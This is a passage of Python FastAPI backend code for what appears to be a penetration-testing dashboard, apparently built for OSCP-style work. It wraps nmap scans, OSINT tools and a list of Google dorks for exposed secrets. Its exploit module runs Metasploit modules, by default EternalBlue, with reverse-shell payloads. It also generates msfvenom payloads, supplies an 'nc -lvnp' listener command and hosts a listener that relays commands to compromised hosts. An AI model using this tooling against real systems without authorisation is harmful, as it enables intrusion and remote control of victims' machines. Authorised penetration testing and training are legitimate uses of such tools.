    save_scan(scan_id, "services", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"services","ports":ports,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/recon/os")
async def recon_os(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "-O", "--osscan-guess", "-T4", host], timeout=120)
    out = result.get("output","")
    os_line = next((l for l in out.splitlines() if "OS details:" in l or "Aggressive OS guesses:" in l), None)
    os_name = None; accuracy = None; matches = []
    if os_line:
        raw = os_line.split(":",1)[-1].strip()
        for entry in [e.strip() for e in raw.split(",")]:
            m = re.match(r"(.+?)\s*\((\d+)%\)", entry)
            if m: matches.append({"name": m.group(1).strip(), "accuracy": int(m.group(2))})
            elif entry: matches.append({"name": entry, "accuracy": None})
        if matches:
            os_name = matches[0]["name"]
            accuracy = matches[0]["accuracy"]
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "os", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"os","os":os_name,"accuracy":accuracy,"matches":matches,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

def _clean_banner(raw: str) -> str:
    """Strip binary/non-printable bytes from nmap banner output."""
    cleaned = re.sub(r'\\x[0-9a-fA-F]{2}', '', raw)
    cleaned = re.sub(r'[^\x20-\x7E]', ' ', cleaned)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    # If mostly garbage remains (< 4 printable words), use a generic label
    if len(cleaned) < 8:
        return "(binary handshake — see raw output)"
    return cleaned[:200]

@app.post("/api/recon/banner")
async def recon_banner(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["nmap", "--script=banner", "-p", "21,22,25,80,443,8080,3306,3389", host], timeout=120)
    out = result.get("output","")
    banners = {}
    cur = None
    for line in out.splitlines():
        pm = re.match(r"(\d+)/tcp", line.strip())
        if pm: cur = pm.group(1)
        bm = re.match(r"\|\s+banner:\s*(.*)", line.strip())
        if bm and cur: banners[cur] = _clean_banner(bm.group(1).strip())
    scan_id = str(uuid.uuid4())
    save_scan(scan_id, "banner", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"banner","banners":banners,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  OSINT & THREAT INTEL MODULE
# ══════════════════════════════════════════════════════════════

@app.post("/api/osint/email_osint")
async def osint_email_osint(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(
        ["theHarvester", "-d", host, "-b", "crtsh,duckduckgo,hackertarget,urlscan,rapiddns", "-l", "200"],
        timeout=120
    )
    out = result.get("output", "")
    FP_DOMAINS = ["edge-security.com","github.com","python.org","kali.org","harvester"]
    all_emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)
    emails = list(set(e for e in all_emails if not any(fp in e for fp in FP_DOMAINS)))
    hosts  = list(set(re.findall(r"[a-zA-Z0-9\-\.]+\." + re.escape(host), out)))
    ips    = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
    # Extract ASNs with known labels
    ASN_NAMES = {"AS13335":"Cloudflare","AS16509":"Amazon AWS","AS396982":"Google Cloud",
                 "AS54113":"Fastly","AS15169":"Google","AS8075":"Microsoft Azure",
                 "AS14061":"DigitalOcean","AS16276":"OVH","AS22612":"Namecheap",
                 "AS45012":"Alibaba Cloud","AS8648":"Sprint/T-Mobile"}
    asns = []
    asn_block = re.search(r"ASNS found.*?\n(.*?)(?:\[\*\]|\Z)", out, re.DOTALL)
    if asn_block:
        for l in asn_block.group(1).splitlines():
            a = l.strip()
            if a.startswith("AS"):
                label = ASN_NAMES.get(a, "")
                asns.append(f"{a} — {label}" if label else a)
    # Extract interesting URLs — filter out long tracking/redirect URLs
    urls = []
    url_block = re.search(r"Interesting Urls found.*?\n(.*?)(?:\[\*\]|\Z)", out, re.DOTALL)
    if url_block:
        for l in url_block.group(1).splitlines():
            u = l.strip()
            if u.startswith("http") and len(u) <= 120 and "upn=" not in u and "utm_" not in u:
                urls.append(u)
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "email_osint", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"email_osint",
            "emails":emails[:50],"hosts":hosts[:50],"ips":ips[:20],
            "asns":asns[:20],"interesting_urls":urls[:30],
            "total_emails":len(emails),"raw_output":out[:5000],
            "timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/recon_ng")
async def osint_recon_ng(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    import tempfile, os as _os
    # Install modules then run — recon-ng apt install has no modules by default
    script = (
        f"workspaces create oscp_{host.replace('.','_')}\n"
        f"marketplace install recon/domains-hosts/certificate_transparency\n"
        f"marketplace install recon/domains-hosts/hackertarget\n"
        f"modules load recon/domains-hosts/certificate_transparency\n"
        f"options set SOURCE {host}\nrun\n"
        f"modules load recon/domains-hosts/hackertarget\n"
        f"options set SOURCE {host}\nrun\n"
        f"show hosts\nexit\n"
    )
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(script); path = f.name
    try:
        result = await run_tool(["recon-ng", "-r", path], timeout=180)
    finally:
        try: _os.unlink(path)
        except: pass
    out = result.get("output", "")
    hosts = list(set(re.findall(r"[a-zA-Z0-9\-\.]+\." + re.escape(host), out)))
    hosts = [h for h in hosts if h != host and not h.startswith(".")]
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "recon_ng", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"recon_ng",
            "hosts":hosts[:50],"raw_output":out[:3000],
            "timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/spiderfoot")
async def osint_spiderfoot(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(
        ["python3", "-m", "spiderfoot.cli", "-s", host,
         "-t", "INTERNET_NAME,IP_ADDRESS,EMAILADDR",
         "-m", "sfp_dnsresolve,sfp_googlesearch,sfp_dnsbrute"],
        timeout=180
    )
    out = result.get("output", "")
    if not out.strip() or "No module" in out:
        result2 = await run_tool(["sfcli.py", "-s", host, "-t", "INTERNET_NAME,IP_ADDRESS,EMAILADDR"], timeout=180)
        out = result2.get("output", out)
    emails = list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
    ips    = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
    hosts  = list(set(re.findall(r"[a-zA-Z0-9\-]+\." + re.escape(host), out)))
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "spiderfoot", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"spiderfoot",
            "emails":emails[:30],"ips":ips[:20],"hosts":hosts[:30],"raw_output":out[:3000],
            "timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/virustotal")
async def osint_virustotal(req: ScanRequest, user=Depends(verify_token)):
    api_key = req.api_key or os.getenv("VIRUSTOTAL_KEY", "")
    if not api_key:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"virustotal",
                "error":"No VirusTotal API key — add it in Settings","timestamp":datetime.datetime.utcnow().isoformat()}
    host = _recon_host(req.target)
    try:
        import urllib.request
        is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host))
        url = f"https://www.virustotal.com/api/v3/{'ip_addresses' if is_ip else 'domains'}/{host}"
        vt_req = urllib.request.Request(url, headers={"x-apikey": api_key})
        with urllib.request.urlopen(vt_req, timeout=15) as resp:
            data = json.loads(resp.read())
        attrs = data.get("data",{}).get("attributes",{})
        stats = attrs.get("last_analysis_stats",{})
        malicious  = stats.get("malicious",0)
        suspicious = stats.get("suspicious",0)
        scan_id = str(uuid.uuid4())
        return {"scan_id":scan_id,"target":req.target,"tool":"virustotal",
                "malicious":malicious,"suspicious":suspicious,
                "harmless":stats.get("harmless",0),"total_engines":sum(stats.values()),
                "reputation":attrs.get("reputation",0),
                "categories":list(attrs.get("categories",{}).values())[:5],
                "tags":attrs.get("tags",[])[:5],
                "threat_detected":malicious>0 or suspicious>0,
                "timestamp":datetime.datetime.utcnow().isoformat()}
    except Exception as e:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"virustotal",
                "error":str(e),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/abuseipdb")
async def osint_abuseipdb(req: ScanRequest, user=Depends(verify_token)):
    api_key = req.api_key or os.getenv("ABUSEIPDB_KEY", "")
    host = _recon_host(req.target)
    if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
        try:
            import socket; host = socket.gethostbyname(host)
        except: pass
    if not api_key:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"abuseipdb","ip":host,
                "error":"No AbuseIPDB API key — add it in Settings","timestamp":datetime.datetime.utcnow().isoformat()}
    try:
        import urllib.request, urllib.parse
        url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={urllib.parse.quote(host)}&maxAgeInDays=90"
        r = urllib.request.Request(url, headers={"Key":api_key,"Accept":"application/json"})
        with urllib.request.urlopen(r, timeout=15) as resp:
            d = json.loads(resp.read()).get("data",{})
        scan_id = str(uuid.uuid4())
        return {"scan_id":scan_id,"target":req.target,"tool":"abuseipdb","ip":host,
                "abuse_score":d.get("abuseConfidenceScore",0),
                "total_reports":d.get("totalReports",0),
                "country":d.get("countryCode",""),"isp":d.get("isp",""),
                "domain":d.get("domain",""),"is_whitelisted":d.get("isWhitelisted",False),
                "threat_detected":d.get("abuseConfidenceScore",0)>25,
                "timestamp":datetime.datetime.utcnow().isoformat()}
    except Exception as e:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"abuseipdb",
                "ip":host,"error":str(e),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/geoip")
async def osint_geoip(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    import urllib.request, socket as _sock
    try:
        ip = host
        if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
            try: ip = _sock.gethostbyname(host)
            except: ip = host
        with urllib.request.urlopen(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse",
            timeout=10
        ) as resp:
            data = json.loads(resp.read())
        if data.get("status") == "fail":
            raise Exception(data.get("message","ip-api failed"))
        scan_id = str(uuid.uuid4())
        return {"scan_id":scan_id,"target":req.target,"tool":"geoip",
                "ip":data.get("query",ip),"city":data.get("city",""),
                "region":data.get("regionName",""),"country":data.get("country",""),
                "org":data.get("org","") or data.get("isp",""),
                "timezone":data.get("timezone",""),
                "loc":f"{data.get('lat','')},{data.get('lon','')}",
                "hostname":data.get("reverse",""),
                "isp":data.get("isp",""),"as_info":data.get("as",""),
                "timestamp":datetime.datetime.utcnow().isoformat()}
    except Exception:
        try:
            with urllib.request.urlopen(f"https://ipinfo.io/{host}/json", timeout=10) as resp:
                data = json.loads(resp.read())
            scan_id = str(uuid.uuid4())
            return {"scan_id":scan_id,"target":req.target,"tool":"geoip",
                    "ip":data.get("ip",host),"city":data.get("city",""),
                    "region":data.get("region",""),"country":data.get("country",""),
                    "org":data.get("org",""),"timezone":data.get("timezone",""),
                    "loc":data.get("loc",""),"hostname":data.get("hostname",""),
                    "timestamp":datetime.datetime.utcnow().isoformat()}
        except Exception as e2:
            return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"geoip",
                    "error":str(e2),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/sherlock")
async def osint_sherlock(req: ScanRequest, user=Depends(verify_token)):
    t = req.target.strip()
    # Extract bare username — reject if it looks like an IP, domain, or URL
    if t.startswith("http://") or t.startswith("https://"):
        from urllib.parse import urlparse as _up
        t = _up(t).hostname or t
    username = t.lstrip("@").split("/")[-1].split("?")[0].strip()
    is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", username))
    is_domain = bool(re.match(r"^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$", username)) and not is_ip
    if not username or len(username) < 2 or is_ip or is_domain:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"sherlock",
                "error":"Sherlock requires a username — not an IP or domain",
                "username":"","accounts_found":[],"total":0,
                "timestamp":datetime.datetime.utcnow().isoformat()}
    result = await run_tool(["sherlock", username, "--timeout", "5", "--print-found"], timeout=120)
    out = result.get("output", "")
    found = [line.split("[+]")[-1].strip() for line in out.splitlines() if "[+]" in line and "http" in line]
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "sherlock", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"sherlock",
            "username":username,"accounts_found":found[:50],"total":len(found),
            "raw_output":out[:3000],"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/hibp")
async def osint_hibp(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    try:
        import urllib.request
        url = f"https://haveibeenpwned.com/api/v3/breacheddomain/{host}"
        r = urllib.request.Request(url, headers={"User-Agent":"oscp-dashboard","hibp-api-key":req.api_key or ""})
        try:
            with urllib.request.urlopen(r, timeout=10) as resp:
                data = json.loads(resp.read())
            emails = list(data.keys())[:50]
            scan_id = str(uuid.uuid4())
            return {"scan_id":scan_id,"target":req.target,"tool":"hibp","checked":True,
                    "breaches":emails,"total":len(emails),"timestamp":datetime.datetime.utcnow().isoformat()}
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
                        "breaches":[],"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}
            if e.code == 401:
                return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
                        "error":"HIBP API key required — get free key at haveibeenpwned.com/API/Key",
                        "breaches":[],"timestamp":datetime.datetime.utcnow().isoformat()}
            raise
    except Exception as e:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
                "error":str(e),"breaches":[],"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/dnstwist")
async def osint_dnstwist(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(["dnstwist", "--format", "json", "--registered", host], timeout=120)
    out = result.get("output", "")
    domains = []
    try:
        start = out.find("[")
        if start != -1:
            domains = json.loads(out[start:])
    except:
        pass
    if not domains:
        result2 = await run_tool(["dnstwist", "--format", "json", host], timeout=120)
        out2 = result2.get("output", "")
        try:
            start = out2.find("[")
            if start != -1:
                raw = json.loads(out2[start:])
                domains = [d for d in raw if d.get("dns-a") or d.get("dns_a")]
        except:
            pass
    clean = []
    for d in domains[:50]:
        clean.append({
            "domain": d.get("domain",""),
            "fuzzer": d.get("fuzzer",""),
            "dns_a":  d.get("dns-a", d.get("dns_a",[])),
        })
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "dnstwist", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dnstwist",
            "domains":clean,"total":len(clean),
            "raw_output":out[:2000],"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/googledorks")
async def osint_googledorks(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    dorks = [
        f'site:{host} filetype:pdf',
        f'site:{host} filetype:xls OR filetype:xlsx OR filetype:csv',
        f'site:{host} filetype:sql OR filetype:bak OR filetype:backup',
        f'site:{host} inurl:admin OR inurl:login OR inurl:dashboard',
        f'site:{host} inurl:config OR inurl:setup OR inurl:install',
        f'site:{host} intext:password OR intext:"api_key" OR intext:"secret"',
        f'site:{host} inurl:".env" OR inurl:".git" OR inurl:"wp-config"',
        f'site:{host} inurl:phpinfo OR inurl:phpinfo.php',
        f'site:{host} intitle:"index of" OR intitle:"directory listing"',
        f'site:{host} intext:"sql syntax" OR intext:"mysql error" OR intext:"ORA-"',
        f'site:{host} ext:log OR ext:txt inurl:log',
        f'"{host}" site:pastebin.com OR site:paste.ee OR site:hastebin.com',
        f'"{host}" site:github.com password OR secret OR api_key',
        f'"{host}" intext:"@{host}" email list',
        f'related:{host}',
    ]
    scan_id = str(uuid.uuid4())
    return {"scan_id":scan_id,"target":req.target,"tool":"googledorks",
            "dorks":dorks,"total":len(dorks),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/maltego")
async def osint_maltego(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    guide = f"""Maltego CE Guide for: {host}

1. Open Maltego CE -> New Graph
2. Drag a 'Domain' entity -> type '{host}'
3. Right-click -> Run Transforms:
   - To DNS Name [All]        -> discovers subdomains
   - To IP Address [DNS]      -> resolves IPs
   - To Website [DNS]         -> finds related sites
   - To MX Record [DNS]       -> finds mail servers
4. On each IP found:
   - To Netblock [Owner]      -> finds IP ranges
   - To AS Number             -> finds hosting provider
5. On each email/person found:
   - To Social Media Profiles -> finds social accounts

Key transforms for {host}:
  paterva.com/maltego-ce/ — free community edition
  Transforms: DNS, Shodan, HaveIBeenPwned, Twitter
"""
    scan_id = str(uuid.uuid4())
    return {"scan_id":scan_id,"target":req.target,"tool":"maltego",
            "guide":guide,"host":host,"timestamp":datetime.datetime.utcnow().isoformat()}


# ═══════════════════════════════════════════════════════════════
#  EXPLOIT MODULE
# ═══════════════════════════════════════════════════════════════

class ExploitRequest(BaseModel):
    target:         str = ""
    port:           int = 445
    lhost:          str = ""
    lport:          int = 4444
    msf_module:     str = ""
    msf_payload:    str = "windows/x64/shell_reverse_tcp"
    payload_format: str = "exe"
    query:          str = ""
    extra_opts:     str = ""

EXPLOIT_SESSIONS: dict = {}


@app.post("/api/exploit/search")
async def exploit_search(req: ExploitRequest, user=Depends(verify_token)):
    q = req.query.strip() or (req.msf_module.split("/")[-1] if req.msf_module else "") or "ms17-010"
    result = await run_tool(["searchsploit", "--json", q], timeout=30)
    out = result.get("output", "")
    exploits = []
    try:
        import json as _json
        data = _json.loads(out)
        for e in (data.get("RESULTS_EXPLOIT") or data.get("RESULTS_SHELLCODE") or []):
            exploits.append({
                "title":    e.get("Title",""),
                "path":     e.get("Path",""),
                "type":     e.get("Type",""),
                "date":     e.get("Date",""),
                "edb_id":   e.get("EDB-ID",""),
                "platform": e.get("Platform",""),
            })
    except Exception:
        for line in out.splitlines():
            if "|" in line and "Title" not in line and "---" not in line:
                parts = [p.strip() for p in line.split("|")]
                if len(parts) >= 2:
                    exploits.append({"title": parts[0], "path": parts[-1]})
    return {"query": q, "total": len(exploits), "exploits": exploits, "raw_output": out}


@app.post("/api/exploit/vulncheck")
async def exploit_vulncheck(req: ExploitRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else req.target
    port = str(req.port) if req.port else "445"
    result = await run_tool(
        ["nmap", "-p", port, "--script", "vuln,exploit", "-T4", "--open", host],
        timeout=180
    )
    out = result.get("output", "")
    vulns = []
    for line in out.splitlines():
        l = line.strip()
        if any(k in l for k in ["CVE-","VULNERABLE","exploitable","vuln"]):
            vulns.append({"detail": l})
    return {"target": req.target, "port": req.port, "total": len(vulns), "vulns": vulns, "raw_output": out}


async def _auto_detect_payload(module: str, preferred: str = "") -> str:
    """Query msfconsole show payloads and pick best compatible one."""
    rc_path = f"/tmp/msf_pl_{uuid.uuid4().hex}.rc"
    with open(rc_path, "w") as f:
        f.write(f"use {module}\nshow payloads\nexit -y\n")
    try:
        result = await run_tool(["msfconsole", "-q", "-r", rc_path], timeout=60)
    finally:
        try: os.remove(rc_path)
        except: pass
    out = result.get("output", "")
    payloads = []
    for line in out.splitlines():
        m = re.match(r'\s*\d+\s+([\w/]+)\s+', line)
        if m:
            payloads.append(m.group(1))
    if not payloads:
        return preferred
    if preferred in payloads:
        return preferred
    # For backdoor modules prefer interact (no reverse connection needed)
    if "backdoor" in module or "ircd" in module:
        for p in payloads:
            if "interact" in p:
                return p
    # Prefer shell_reverse_tcp > meterpreter for reliability
    for p in payloads:
        if "shell_reverse_tcp" in p:
            return p
    for p in payloads:
        if "reverse" in p:
            return p
    return payloads[0]


@app.post("/api/exploit/msf")
async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else req.target
    if not host:
        return {"error": "Target required"}
    if not req.lhost:
        return {"error": "LHOST required"}
    module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
    # Auto-detect the right payload for this module
    payload = await _auto_detect_payload(module, req.msf_payload or "")
    if not payload:
        payload = req.msf_payload or "windows/x64/shell_reverse_tcp"
    # interact/bind payloads don't use LHOST/LPORT
    is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
    lhost_block = f"set LHOST {req.lhost}\nset LPORT {req.lport}\n" if is_reverse and req.lhost else ""
    rc = (
        f"use {module}\n"
        f"set RHOSTS {host}\n"
        f"set RPORT {req.port}\n"
        + lhost_block +
        f"set PAYLOAD {payload}\n"
        f"set ExitOnSession false\n"
        f"run -j\n"
        f"sleep 25\n"
        f"sessions -l\n"
        f"exit -y\n"
    )
    rc_path = f"/tmp/msf_{uuid.uuid4().hex}.rc"
    with open(rc_path, "w") as f:
        f.write(rc)
    result = await run_tool(["msfconsole", "-q", "-r", rc_path], timeout=90)
    try:
        os.remove(rc_path)
    except:
        pass
    out = result.get("output", "")
    session_opened = "Meterpreter session" in out or "Command shell session" in out or "session 1 opened" in out.lower()
    session_id_m = re.search(r'session (\d+) opened', out, re.IGNORECASE)
    session_id = int(session_id_m.group(1)) if session_id_m else (1 if session_opened else None)
    error = None
    for line in out.splitlines():
        if "[-]" in line or "Error" in line or "failed" in line.lower():
            error = line.strip()
            break
    message = "Session opened" if session_opened else (error or "No session — check module/payload/target compatibility")
    return {
        "target": req.target, "module": module, "payload": payload,
        "session_opened": session_opened, "session_id": session_id,
        "error": error, "message": message,
        "raw_output": out
    }


@app.post("/api/exploit/payload")
async def exploit_payload(req: ExploitRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error": "LHOST required"}
    payload = req.msf_payload or "windows/x64/shell_reverse_tcp"
    fmt     = req.payload_format or "exe"
    out_file = f"/tmp/payload_{uuid.uuid4().hex}.{fmt}"
    cmd = [
        "msfvenom", "-p", payload,
        f"LHOST={req.lhost}", f"LPORT={req.lport}",
        "-f", fmt, "-o", out_file
    ]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output", "")
    size = None
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    if size_m:
        size = int(size_m.group(1))
    try:
        os.remove(out_file)
    except:
        pass
    return {
        "payload": payload, "format": fmt,
        "lhost": req.lhost, "lport": req.lport,
        "size": size, "raw_output": out,
        "output_file": out_file,
        "listener_cmd": f"nc -lvnp {req.lport}",
        "message": f"Payload generated: {size} bytes ({fmt})" if size else out.strip()
    }


@app.post("/api/exploit/shell/start")
async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"exp_shell_{lport}"
    if lid in EXPLOIT_SESSIONS:
        try:
            if EXPLOIT_SESSIONS[lid].server: EXPLOIT_SESSIONS[lid].server.close()
            if EXPLOIT_SESSIONS[lid].writer: EXPLOIT_SESSIONS[lid].writer.close()
        except: pass
    try:
        subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    except FileNotFoundError:
        try:
            subprocess.run(["pkill", "-f", f":{lport}"], capture_output=True)
        except Exception:
            pass
    except Exception:
        pass
    await asyncio.sleep(0.5)
    session = _ShellSession(lid, lport)
    EXPLOIT_SESSIONS[lid] = session
    try:
        server = await asyncio.start_server(
            lambda r, w: _shell_handler(r, w, lid, EXPLOIT_SESSIONS),
            "0.0.0.0", lport, reuse_port=True)
        session.server = server
        asyncio.create_task(server.serve_forever())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"Listener ready on port {lport}"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}


@app.get("/api/exploit/shell/{lid}/output")
async def exploit_shell_output(lid: str, user=Depends(verify_token)):
    s = EXPLOIT_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}


@app.post("/api/exploit/shell/{lid}/cmd")
async def exploit_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = EXPLOIT_SESSIONS.get(lid)
    if not s or not s.writer: return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.writer.write((cmd + "\n").encode())
        await s.writer.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}


@app.post("/api/exploit/shell/{lid}/stop")
async def exploit_shell_stop(lid: str, user=Depends(verify_token)):
    s = EXPLOIT_SESSIONS.pop(lid, None)
    if s:
        try:
            if s.server: s.server.close()
            if s.writer: s.writer.close()
        except: pass
    return {"stopped": True}
